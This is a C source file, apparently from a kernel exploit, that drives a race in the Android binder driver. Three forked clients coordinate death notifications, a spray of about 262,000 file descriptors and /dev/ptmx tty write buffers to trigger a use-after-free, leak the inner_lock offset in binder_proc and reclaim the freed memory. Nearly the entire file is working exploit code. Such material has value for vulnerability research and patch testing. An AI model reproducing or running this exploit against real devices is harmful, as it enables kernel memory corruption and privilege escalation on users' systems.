#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <errno.h>
#include <termios.h>
#include "binder.h"
#include "token_manager.h"
#include "util.h"
#include "exploit.h"
#include "rw.h"

#define CA_NR_STRONG_NODES 1
#define NR_SPAM_FD 262000
#define AB_MAGIC 0xbadcab1ebadcab1eUL

static pid_t __gettid(void) {
    return syscall(__NR_gettid);
}

void *monitor_thread_a(void *arg) {
    poc_client_t *client = arg;
    poc_client_private_data_a *pda = client->private_data;
    exploit_ctx_t *ctx = client->ctx;
    int ret = 0;
    u8 read_buf[256];
    size_t read_consumed = 0;
    void *payload;
    
    pin_to_cpu(3);


    binder_enter_looper(client->binder.fd);

    light_cond_wait(&pda->lc_watch);

    LOGD("%s: Waiting for death notification\n", __func__);
    binder_read(client->binder.fd, read_buf, sizeof(read_buf), &read_consumed);

    if (binder_read_buffer_lookup(read_buf, read_consumed, BR_DEAD_BINDER, &payload) == 0) {
        binder_uintptr_t cookie = *(binder_uintptr_t *)payload;
        LOGD("%s: Found dead binder (cookie = 0x%016llx)\n", __func__, cookie);
        binder_dead_done(client->binder.fd, cookie);
    }

    LOGD("%s: Done\n", __func__);

    return NULL;
}

int recv_strong_refs(poc_client_t *client) {
    poc_client_private_data_a *pda = client->private_data;
    uint8_t read_buf[256] = {0};
    size_t read_consumed = 0;
    int rc;

    LOGD("%s: Waiting for strong nodes...\n", name_of(client->idx));
    binder_read(client->binder.fd, read_buf, sizeof(read_buf), &read_consumed);

    void *payload;
    struct binder_transaction_data *btd;
    rc = binder_read_buffer_lookup(read_buf, read_consumed, BR_TRANSACTION, &payload);
    if (rc < 0) {
        LOG("%s: BR_TRANSACTION not found!\n", name_of(client->idx));
        return -1;
    }
    btd = payload;

    struct flat_binder_object *p_fbo;
    uint32_t nr_offsets = btd->offsets_size / sizeof(binder_uintptr_t);
    pda->strong_handles = calloc(nr_offsets, sizeof(uint32_t));
    if (pda->strong_handles == NULL) {
        FAIL();
    }

    
    binder_uintptr_t *offsets = (binder_uintptr_t *)btd->data.ptr.offsets;
    uint32_t j = 0;
    for (uint32_t i = 0; i < nr_offsets; i++) {
        p_fbo = (struct flat_binder_object *)(btd->data.ptr.buffer + offsets[i]);
        if (p_fbo->hdr.type != BINDER_TYPE_HANDLE) {
            continue;
        }
        pda->strong_handles[j++] = p_fbo->handle;
        binder_acquire(client->binder.fd, p_fbo->handle);
        binder_increfs(client->binder.fd, p_fbo->handle);
    }
    pda->nr_strong_handles = j;

    LOGD("%s: %u references accepted\n", name_of(client->idx), j);
    binder_free_transaction_buffer(client->binder.fd, btd->data.ptr.buffer);

    {
        struct binder_txn *txn  = binder_txn_create(client->handles[2], 0, 0);
        binder_txn_dispatch(txn, client->binder.fd, true, NULL, 0, NULL);
        binder_txn_destroy(txn);
    }

    return 0;
}

int send_weak_refs(poc_client_t *client, uint32_t target_handle) {
    int rc;
    exploit_ctx_t *ctx = client->ctx;
    poc_client_private_data_a *pda = client->private_data;
    u8 readbuf[256] = {0};
    u64 readconsumed = 0;
    int ret = 0;

    LOGD("%s: Sending %lu strong handles to B\n", name_of(client->idx), pda->nr_strong_handles);

    struct binder_txn *txn = binder_txn_create(target_handle, 0, 0);
    u64 raw = AB_MAGIC;
    binder_txn_add_raw(txn, &raw, sizeof(raw));

    int *fd_list = SYSCHK(mmap(0, NR_SPAM_FD*4, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0));
    for (int i = 0; i < NR_SPAM_FD; i++) {
        fd_list[i] = client->binder.fd;
    }
    madvise(fd_list, NR_SPAM_FD*4, MADV_PAGEOUT); // On kernel >= 5.4 this will benefit us.

    ret = binder_txn_add_fd_array(txn, fd_list, NR_SPAM_FD);
    if (ret < 0) {return -1;}

    for (uint32_t i = 0; i < pda->nr_strong_handles; i++) {
        if (binder_txn_add_weak_handle_object(txn, pda->strong_handles[i]) < 0) {return -1;}
    }

    light_cond_broadcast(&pda->lc_watch);
    LOGD("Txn size: %fKB\n", (double)binder_txn_size(txn)/1024.0);
    rc = binder_txn_dispatch(txn, client->binder.fd, 0, readbuf, sizeof(readbuf), &readconsumed);
    if (rc < 0) {
        LOG("%s: transaction failed\n", name_of(client->idx));
        return -1;
    }

    ctx->a_got_br_failed_reply = (binder_read_buffer_lookup(readbuf, readconsumed, BR_FAILED_REPLY, NULL) == 0);

    LOGD("%s: Done sending transaction. %s\n", name_of(client->idx), ctx->a_got_br_failed_reply ? "BR_FAILED_REPLY" : "");

    return 0;
}

int poc_a_wait_for_c_death(poc_client_t *client){
    u8 read_buf[256];
    u64 read_consumed = 0;
    int ret = 0;
    void *payload = NULL;

    LOGD("%s: Waiting for C death notification\n", __func__);
    binder_read(client->binder.fd, read_buf, sizeof(read_buf), &read_consumed);

    if (binder_read_buffer_lookup(read_buf, read_consumed, BR_DEAD_BINDER, &payload) == 0) {
        binder_uintptr_t cookie = *(binder_uintptr_t *)payload;
        LOGD("%s: Found dead binder (cookie = 0x%016llx)\n", __func__, cookie);
        binder_dead_done(client->binder.fd, cookie);
    }
    return 0;
}


int do_client_a(poc_client_t *client) {
    poc_client_private_data_a *pda;
    exploit_ctx_t *ctx = client->ctx;
    int rc;

    client->private_data = zalloc(sizeof(poc_client_private_data_a));
    if (client->private_data == NULL) {
        FAIL();
    }
    pda = client->private_data;
    light_cond_init_shared(&pda->lc_watch);

    /* Register a death notification with B */
    binder_register_death(client->binder.fd, client->handles[1], 0x5858585858585858);

    binder_enter_looper(client->binder.fd);

    /* Recieve strong handles from C */
    rc = recv_strong_refs(client);
    if (rc < 0) {
        return -1;
    }

    /* Ensure handles are "faulty" */
    light_cond_broadcast(&ctx->lc_c_thread_exit_post);
    light_cond_wait(&ctx->lc_c_thread_exit_pend);

    /* Register death notification on the last strong handle.
     * This is done to know when C is released from spin_lock().
     */
    binder_register_death(client->binder.fd, pda->strong_handles[pda->nr_strong_handles-1], 0x6161616161616161UL);

    pthread_t th;
    pthread_create(&th, NULL, monitor_thread_a, client);

    rc = send_weak_refs(client, client->handles[1]);
    if (rc < 0) { return -1; }
    
    pthread_join(th, NULL);

    /* We are done with the strong handles. */
    free(pda->strong_handles);

    /* Wake up C */
    light_cond_broadcast(&ctx->lc_wakeup_c);
    
    /* Wait for recieving C's death notification.
     * This will tell us C got out of the spin_lock().
     */
    poc_a_wait_for_c_death(client);

    /* C died. Notify everyone else. */
    atomic_fetch_add(&ctx->sync_var_c_died, 1);
    LOG("[x] Finish spinning at spin_lock()\n");

    free(pda);

    return 0;
}

struct blocker_thread_info {
    exploit_ctx_t *ctx;
    int blocker_index;
    int ptmx;
    u8 *data;
    size_t data_size;
};

void *blocker_thread(void *arg) {
    struct blocker_thread_info *info = arg;
    pin_to_cpu(0);
    flush_ptmx(info->ptmx);

    turn_off_ptmx(info->ptmx); // make the write() syscall to block.

    light_cond_wait(&info->ctx->lc_spray_tty_post);

    /* Create tty write buffer and block */
    SYSCHK(write(info->ptmx, info->data, info->data_size));

    atomic_store(&info->ctx->sync_var_vuln_ptmx[info->blocker_index], 1);

    return NULL;
}

int read_all(int fd, u8 *buf, size_t size) {
    size_t total = size;
    int ret;
    int attempt = 0;
    while(size) {
        ret = read(fd, buf + (total - size), size);
        if (ret == -1) {
            attempt++;
            if (attempt % 1000 == 0) {
                usleep(100*1000);
            }
            continue;
        }
        attempt = 0;
        size -= ret;
    }
    return 0;
}

int find_lock_offset(u8 *data, size_t data_size) {
    for (int offset = 0; offset < data_size; offset += 4) {
        u32 v = *(u32 *)&data[offset];
        if (v & ~0xff) {
            return offset;
        }
    }
    return -1;
}

void unblock_blocker_thread(poc_client_t *client, int blocker_thread_index) {
    exploit_ctx_t *ctx = client->ctx;
    poc_client_private_data_b *b = client->private_data;
    while (!atomic_load(&ctx->sync_var_vuln_ptmx[blocker_thread_index])) {
        turn_on_ptmx(b->ptmx[blocker_thread_index]);
    }
}

int leak_inner_lock_offset(poc_client_t *client) {
    exploit_ctx_t *ctx = client->ctx;
    poc_client_private_data_b *b = client->private_data;
    int ret = -1;
    int i = 0;
    u8 *data2 = NULL, *data = NULL;

    /* Skip offset detection if C is already dead.  */
    if (atomic_load(&ctx->sync_var_c_died) > 0) {
        ret = -3;
        goto join_blocker_threads;
    }

    data = zalloc(b->data_size);
    if (data == NULL){FAIL();}

    for (i = 0; i < ctx->nr_vuln_ptmx; i++) {
        LOGD("\tTesting ptmx %d (fd %d)\n", i, b->ptmx[i]);
        unblock_blocker_thread(client, i);
        make_ptmx_non_blocking(b->ptmx[i]);
        LOGD("\t\tReading ptmx %d\n", i);
        ret = read_all(b->ptmx[i], data, b->data_size);
        if (ret == -1) {break;}
        ret = find_lock_offset(data, b->data_size);
        if (ret >= 0) {
            break;
        }
    }
join_blocker_threads:
    data2 = zalloc(2048);
    if (data2 == NULL){FAIL();}
    LOGD("\tFreeing ptmx...\n");
    for (int j = 0; j < ctx->nr_vuln_ptmx; j++) {
        unblock_blocker_thread(client, j);
        turn_off_ptmx(b->ptmx[j]);
        make_ptmx_non_blocking(b->ptmx[j]);
        /* This will free the spinlock if it waits on it */
        write(b->ptmx[j], data2, 1024); /* Ignore errors */
        /* This will free the tty write buffer */
        write(b->ptmx[j], data2, 2048); /* Ignore errors */
    }
    LOGD("\tJoining blocker threads...\n");
    for (int j = 0; j < ctx->nr_vuln_ptmx; j++){
        // LOGD("\t\tJoining blocker thread %d\n", j);
        pthread_join(b->blocker_threads[j], NULL);
    }
    LOGD("\tAll blocker threads joined.\n");
    free(data);
    free(data2);
    return ret < 0 && i == ctx->nr_vuln_ptmx ? -2 : ret;
}

void free_ptmx_write_buffers(poc_client_t *client, bool zero_old) {
    exploit_ctx_t *ctx = client->ctx;
    poc_client_private_data_b *b = client->private_data;
    u8 *data = zalloc(2048);
    if (data == NULL){FAIL();}
    for (int i = 0; i < ctx->nr_vuln_ptmx; i++) {
        turn_off_ptmx(b->ptmx[i]);
        make_ptmx_non_blocking(b->ptmx[i]);
        if (zero_old) {
            // zero-out the old write buffer.
            write(b->ptmx[i], data, 1024); /* Ignore errors */
        }
        write(b->ptmx[i], data, 2048); /* Ignore errors */
    }
    free(data);
}

void alloc_ptmx_write_buffers(poc_client_t *client) {
    exploit_ctx_t *ctx = client->ctx;
    poc_client_private_data_b *b = client->private_data;
    for (int i = 0; i < ctx->nr_vuln_ptmx; i++) {
        turn_off_ptmx(b->ptmx[i]);
        make_ptmx_non_blocking(b->ptmx[i]);
        write(b->ptmx[i], b->data, b->data_size); /* Ignore errors */
    }
}

int do_client_b(poc_client_t *client) {
    int rc;
    client->private_data = zalloc(sizeof(poc_client_private_data_b));
    if (client->private_data == NULL) {
        FAIL();
    }
    exploit_ctx_t *ctx = client->ctx;
    poc_client_private_data_b *b = client->private_data;
    struct blocker_thread_info *bti = calloc(ctx->nr_vuln_ptmx, sizeof(struct blocker_thread_info));
    if (bti == NULL) {FAIL();}
    b->private = bti;
    b->data_size = 1024;
    b->data = zalloc(b->data_size);
    if (b->data == NULL) {FAIL();}
    for (int i = 0; i < b->data_size/4; i++) {
        u32 *p = (u32 *)&b->data[i*4];
        if (ctx->vuln_mode == vuln_mode_crash) {
            *p = 0x41414141;
        } else {
            *p = 0x41;
        }
    }
    /* Pre-initialize ptmx and spawn blocker threads */
    for (int i = 0; i < ctx->nr_vuln_ptmx; i++) {
        b->ptmx[i] = ctx->vuln_ptmx[i];
        if (ctx->vuln_mode == vuln_mode_detect) {
            make_ptmx_echo(b->ptmx[i]);
            make_ptmx_blocking(b->ptmx[i]);
            bti[i].ctx = client->ctx;
            bti[i].ptmx = b->ptmx[i];
            bti[i].data = b->data;
            bti[i].data_size = b->data_size;
            bti[i].blocker_index = i;
            pthread_create(&b->blocker_threads[i], NULL, blocker_thread, &bti[i]);
        }
    }

    binder_enter_looper(client->binder.fd);

    u64 *p = client->binder.vmstart;
    pin_to_cpu(3);
    LOGD("%s: Searching for magic %016lx....\n", name_of(client->idx), AB_MAGIC);
    while(*p != AB_MAGIC);
    LOGD("%s: Destroying\n", name_of(client->idx));
    binder_client_destroy(&client->binder);
    LOGD("%s: Finish. \n", name_of(client->idx));
    pin_to_cpu(0);
    light_cond_wait(&ctx->lc_spray_tty_post);
    switch(ctx->vuln_mode) {
        case vuln_mode_exploit: {
        alloc_ptmx_write_buffers(client);
        free_ptmx_write_buffers(client, false);
        light_cond_broadcast(&ctx->lc_timer_proc);
        } break;

        case vuln_mode_crash:{
        alloc_ptmx_write_buffers(client);
        /* Trigger the "use" */
        light_cond_broadcast(&ctx->lc_spray_tty_pend);
        } break;

        case vuln_mode_detect: {
        /* Wait for blocker threads to block on write() */
        sleep(1); 
        /* Trigger the "use" */
        light_cond_broadcast(&ctx->lc_spray_tty_pend);
        /* Wait for the "use" to actually happen */
        usleep(500*1000);
        /* Read from every ptmx and leak the offset */
        /* Also Free tty write buffers and zero them out to release the spinlock */
        int offset = leak_inner_lock_offset(client);
        LOGD("offsetof(inner_lock, binder_proc) = %d\n", offset);
        ctx->binder_proc_inner_lock_offset = offset;

        } break;

        default: break;
    }

    free(b->data);
    free(b->private);
    free(b);

    sleep(1);

    return 0;
}

void *c_sending_thread(void *arg) {
    poc_client_t *client = arg;
    exploit_ctx_t *ctx = client->ctx;
    u32 magic = 0xcccccccc;
    int ret = 0;
    
    struct binder_txn *txn = binder_txn_create(client->handles[0], 0, 0);

    for (int i = 0; i < CA_NR_STRONG_NODES; i++) {
        u64 cookie = ((u64)i << 32) | magic;
        ret = binder_txn_add_binder_object(txn, cookie, cookie);
        if (ret < 0) {FAIL();}
    }

    ret = binder_txn_dispatch(txn, client->binder.fd, 0, NULL, 0, NULL);
    if (ret < 0) {FAIL();}

    light_cond_wait(&ctx->lc_c_thread_exit_post);

    SYSCHK(ioctl(client->binder.fd, BINDER_THREAD_EXIT));

    light_cond_broadcast(&ctx->lc_c_thread_exit_pend);
    return NULL;
}

int do_client_c(poc_client_t *client) {
    int ret = 0;
    exploit_ctx_t *ctx = client->ctx;

    binder_enter_looper(client->binder.fd);

    pthread_t th;
    pthread_create(&th, NULL, c_sending_thread, client);
    pthread_join(th, NULL);

    LOGD("%s: Wait for A...\n", name_of(client->idx));
    light_cond_wait(&ctx->lc_wakeup_c);
    if (!ctx->a_got_br_failed_reply) {
        // if "A" did not got BR_FAILED_REPLY,
        // then the race surely did not work. bail out.
        return 0;
    }
    light_cond_broadcast(&ctx->lc_spray_tty_post);
    light_cond_wait(&ctx->lc_spray_tty_pend);

    pin_to_cpu(4); // don't shutdown cpu 0...
    LOG("[x] Trigger use-after-free\n");
    binder_client_destroy(&client->binder);

    return 0;
}

static inline int name_to_binder(const char *name) {
    return name[0] << 8 | name[1];
}

int lookup_handles(poc_client_t *client, uint32_t tm_handle, int *targets) {
    int rc;
    int target;
    uint32_t handle;
    exploit_ctx_t *ctx = client->ctx;
    while (*targets >= 0) {
        target = *targets++;
        client->handles[target] = -1; /* always initialize to something */
        if (target != client->idx) {
            rc = token_manager_lookup(client->binder.fd,
                                tm_handle,
                                &ctx->tokens[target],
                                &handle);
            if (rc < 0) {
                LOG("%s: failed to lookup %s\n", name_of(client->idx), name_of(target));
                return -1;
            }
            client->handles[target] = handle;
            LOGD("%s: lookup %s => handle = %d\n", name_of(client->idx), name_of(target), handle);
        }
    }
    return 0;
}

int poc_client_init(poc_client_t *client) {
    int rc;
    const char *name = name_of(client->idx);
    exploit_ctx_t *ctx = client->ctx;

    pin_to_cpu(0);
    if (client->idx == 1) {
        for (int i = 0; i < ctx->nr_vuln_ptmx; i++){
            ctx->vuln_ptmx[i] = SYSCHK(open("/dev/ptmx", O_RDWR | O_NONBLOCK));
            turn_off_ptmx(ctx->vuln_ptmx[i]);
        }
    }
    rc = binder_client_init(&client->binder, NULL);
    if (rc < 0) {
        LOG("Failed to initialize binder client\n");
        return -1;
    }

    LOGD("[%d:%d] New binder client: %s\n", getpid(), __gettid(), name);

    uint32_t tm_handle = -1;
    rc = find_token_manager(client->binder.fd, &tm_handle);
    if (rc < 0) {
        LOG("Failed to find token manager\n");
        return -1;
    }

    struct token *token = &ctx->tokens[client->idx];

    rc = token_manager_register(client->binder.fd, 
                                tm_handle, 
                                name_to_binder(name),
                                0,
                                token);
    if (rc < 0) {
        LOG("Failed to register with token manager\n");
        return -1;
    }

    pthread_barrier_wait(&ctx->br_init_register);

    int targets[NUM_CLIENTS + 1];
    int i = 0;
    if (client->idx == 0) {
        targets[i++] = 1; // A looks-up B
    } else if (client->idx == 2) {
        targets[i++] = 0; // C only looks-up A
    }
    targets[i] = -1; // terminate

    rc = lookup_handles(client, tm_handle, targets);
    if (rc < 0) {
        LOG("%s: Failed to lookup handles\n", name_of(client->idx));
        return -1;
    }

    pthread_barrier_wait(&ctx->br_init_lookup);

    return 0;
}

int do_client(exploit_ctx_t *ctx, int idx) {
    int rc;
    int ret = 0;
    poc_client_t *client = NULL;
    
    client = zalloc(sizeof(poc_client_t));
    if (client == NULL) {
        return 1;
    }

    client->idx = idx;
    client->ctx = ctx;

    rc = poc_client_init(client);
    if (rc < 0) {
        LOG("Failed to initialize client %d\n", client->idx);
        ret = 1;
        goto out;
    }

    void *dispatch[NUM_CLIENTS] = {do_client_a, do_client_b, do_client_c};
    rc = ((int (*)(poc_client_t *))dispatch[client->idx])(client);
    if (rc < 0) {
        LOG("Client %d failed\n", client->idx);
        ret = 1;
        goto out;
    }

out:
    binder_client_destroy(&client->binder);
    free(client);
    client = NULL;
    return ret;
}

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void init_exploit_ctx(exploit_ctx_t *ctx) {
    init_shared_barrier(&ctx->br_init_register, NUM_CLIENTS);
    init_shared_barrier(&ctx->br_init_lookup, NUM_CLIENTS);
    light_cond_init_shared(&ctx->lc_close_b);
    light_cond_init_shared(&ctx->lc_wakeup_c);
    light_cond_init_shared(&ctx->lc_spray_tty_post);
    light_cond_init_shared(&ctx->lc_spray_tty_pend);
    light_cond_init_shared(&ctx->lc_c_thread_exit_post);
    light_cond_init_shared(&ctx->lc_c_thread_exit_pend);
}

int vuln(exploit_ctx_t *ctx, enum vuln_mode vuln_mode) {
    pid_t pids[NUM_CLIENTS];
    int ret = 0;

    init_exploit_ctx(ctx);
    ctx->vuln_mode = vuln_mode;
    ctx->nr_vuln_ptmx = vuln_mode == vuln_mode_detect ? NR_DETECT_PTMX : NR_INITIAL_PTMX;
    
    LOG("[x] Trigger vulnerability... (mode = %d)\n", vuln_mode);
    for (int i = 0; i < NUM_CLIENTS; i++) {
        pid_t pid;
        switch(pid = SYSCHK(fork())) {
            case 0: exit(do_client(ctx, i));
            default: break;
        }
        pids[i] = pid;
    }

    for (int i = 0; i < NUM_CLIENTS; i++) {
        waitpid(pids[i], NULL, 0);
    }
    
    return 0;
}